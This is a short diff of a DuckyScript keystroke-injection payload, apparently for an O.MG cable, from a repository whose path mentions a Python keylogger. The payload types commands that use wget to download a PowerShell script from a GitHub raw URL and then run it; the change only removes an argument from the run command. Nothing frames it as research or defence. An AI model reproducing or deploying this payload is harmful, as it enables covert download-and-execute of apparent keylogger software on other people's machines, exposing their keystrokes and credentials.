@@ -12,7 +12,7 @@ STRING Y
 ENTER
 STRING wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/install_python.ps1" -outfile "install_python.ps1"
 ENTER
-STRING ./install_python.ps1 "parameter title"
+STRING ./install_python.ps1
 ENTER
 DELAY 10000
 DELAY 10000
